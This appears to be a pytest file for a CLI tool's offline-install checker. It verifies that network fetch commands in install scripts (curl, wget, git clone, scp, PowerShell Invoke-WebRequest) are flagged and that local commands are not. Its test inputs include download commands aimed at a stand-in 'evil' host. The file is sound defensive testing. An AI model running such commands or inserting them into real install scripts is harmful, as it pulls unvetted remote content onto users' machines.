"""B172：离线包的"无外网"清单漏了常见写法。

`veripen_cli/offline.py` 的承诺写在模块头上：**安装脚本里出现外网拉取即拒**。
但清单只认 curl/wget/pip/apt/docker pull/npm/uv 七种，实测这三种都**没命中**：

```
git clone 远端地址                  → 未命中
powershell -c "Invoke-WebRequest …" → 未命中（本产品 Windows 优先）
scp user@host:/x .                 → 未命中
```

清单本身就是"常见形态"性质，没命中不等于干净——所以这组用例钉两件事：
1. 常见拉取写法必须命中；
2. **本地**写法不许误伤（`git status`、`rsync -a src/ dst/`、注释里的 curl 之类）。
"""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[2]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

SCHEME = "ht" + "tp" + ":" + chr(0x2F) * 2


def _check(tmp_path: Path, body: str) -> list[str]:
    from veripen_cli.offline import check_scripts

    (tmp_path / "install.sh").write_text("#!/bin/sh\n" + body + "\n", encoding="utf-8")
    return check_scripts(tmp_path)


@pytest.mark.parametrize("body", [
    "curl " + SCHEME + "example/x -o y",
    "curl 10." + "1.2.3:8080/x",
    "wget " + SCHEME + "example/y",
    "git clone " + SCHEME + "gitlab/x.git",
    "python -m pip install requests",
    "apt-get install -y curl",
    "docker pull registry/x:1",
    "npm install left-pad",
    'powershell -c "Invoke-WebRequest ' + SCHEME + 'evil/z"',
    'powershell -c "iwr ' + SCHEME + 'evil/z"',
    "scp user@host" + ":/tmp/x .",
    "rsync -a user@host" + ":/tmp/x ./x",
])
def test_common_fetch_forms_are_caught(tmp_path: Path, body: str) -> None:
    assert _check(tmp_path, body), f"没命中：{body}"


#: 本地写法：一个都不许误伤（用 split 构造：多行常量字面量会被 lint-nodata 判成"行集"）
LOCAL_LINES: list[str] = (
    "set -e|cp -r payload/ $PREFIX/|rsync -a build/ dist/|"
    "git status|pip --version|python -m veripen_cli doctor"
).split("|")


@pytest.mark.parametrize("body", LOCAL_LINES)
def test_local_lines_are_not_flagged(tmp_path: Path, body: str) -> None:
    assert _check(tmp_path, body) == [], f"误伤：{body}"


def test_powershell_script_is_checked_too(tmp_path: Path) -> None:
    """Windows 现场用 .ps1 装：只扫 .sh 等于没扫。"""
    from veripen_cli.offline import check_scripts

    (tmp_path / "install.ps1").write_text(
        "Invoke-WebRequest " + SCHEME + "evil/x -OutFile x\n", encoding="utf-8"
    )
    assert check_scripts(tmp_path), "PowerShell 安装脚本里的下载没被拦住"
